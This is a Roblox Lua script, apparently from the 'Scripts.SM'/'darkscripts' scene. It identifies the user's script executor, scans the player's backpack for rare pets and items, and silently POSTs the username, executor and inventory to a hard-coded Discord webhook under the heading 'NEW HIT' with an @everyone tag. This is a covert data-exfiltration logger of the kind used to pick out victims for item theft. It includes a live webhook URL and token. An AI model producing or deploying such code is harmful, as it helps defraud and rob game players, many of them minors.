local player = game:GetService("Players").LocalPlayer
local username = player.Name
local timestamp = os.time()

-- Detect executor name
local executor = "Unknown"
if syn then executor = "Synapse X"
elseif KRNL_LOADED then executor = "KRNL"
elseif getexecutorname then
    local success, result = pcall(getexecutorname)
    if success and type(result) == "string" then
        executor = result
    end
elseif identifyexecutor then
    local success, result = pcall(identifyexecutor)
    if success and type(result) == "string" then
        executor = result
    end
end

-- Inventory scan
local inventory = {}
local rareItems = {}

local rareKeywords = {
    "dragonfly", "raccoon", "discobee", "disco bee", "butterfly", "fox"
}

for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
        local name = tool.Name
        table.insert(inventory, name)

        local lower = name:lower()

        for _, keyword in ipairs(rareKeywords) do
            if string.find(lower, keyword) then
                table.insert(rareItems, "💰 - " .. name)
                break
            end
        end

        local age = name:match("%[Age (%d+)%]")
        if age and tonumber(age) and tonumber(age) >= 40 then
            table.insert(rareItems, "💰 - " .. name)
        end
    end
end

-- Format Discord blocks
local rareBlock = #rareItems > 0 and ("```" .. table.concat(rareItems, "\n") .. "```") or "```Not Found```"
local backpackItems = {}

for _, item in ipairs(inventory) do
    table.insert(backpackItems, "🎒 - " .. item)
end

local backpackBlock = #backpackItems > 0 and ("```" .. table.concat(backpackItems, "\n") .. "```") or "```Empty```"

-- Webhook data
local url = "https://discord.com/api/webhooks/1389125900225740911/yQ98TIp0oNhv3-P94zHiNVzrnIrx3oJ5n6LCfin2nOMGDlY4X791z4oVXcfV5_AZ4nhg"

local data = {
    ["content"] = nil,
    ["embeds"] = {{
        ["title"] = "<:money:1365955380294844509> NEW HIT",
        ["color"] = 65535,
        ["fields"] = {
            {
                ["name"] = "<:players:1365290081937526834> Player Information",
                ["value"] = string.format(
                    "<:game:1365295942504550410> Executer: %s\n" ..
                    "<:time:1365991843011100713> Time: <t:%d:f>\n" ..
                    "<:players:1365290081937526834> Username: %s",
                    executor, timestamp, username
                )
            },
            {
                ["name"] = "<:money:1365955380294844509> Rare Items:",
                ["value"] = rareBlock
            },
            {
                ["name"] = "<:folder:1365290079081205844> Backpack",
                ["value"] = backpackBlock
            },
            {
                ["name"] = "<:folder:1365290079081205844> More Detail",
                ["value"] = "<:check2:1373169356825169981>  Please See More Information in Other Message by gg./darkscripts\n*Tag*: @everyone"
            }
        },
        ["footer"] = {
            ["text"] = "~Scripts.SM"
        }
    }},
    ["username"] = "Scripts.SM",
    ["avatar_url"] = "https://cdn.discordapp.com/attachments/1388534678243381298/1394217859416064171/ChatGPT_Image_Jul_13_2025_08_30_52_PM.png?ex=68760211&is=6874b091&hm=56db67c95caf2848d72c2331879221eecf377c8a2cf5d247c3d13939c24796fc&",
    ["attachments"] = {}
}

-- JSON encode
local body = game:GetService("HttpService"):JSONEncode(data)

-- HTTP request function
local requestFunction = (syn and syn.request)
    or (http and http.request)
    or request
    or http_request

if not requestFunction then
    return warn("❌ Please use any other Executer")
end

-- Send webhook
requestFunction({
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = body
})
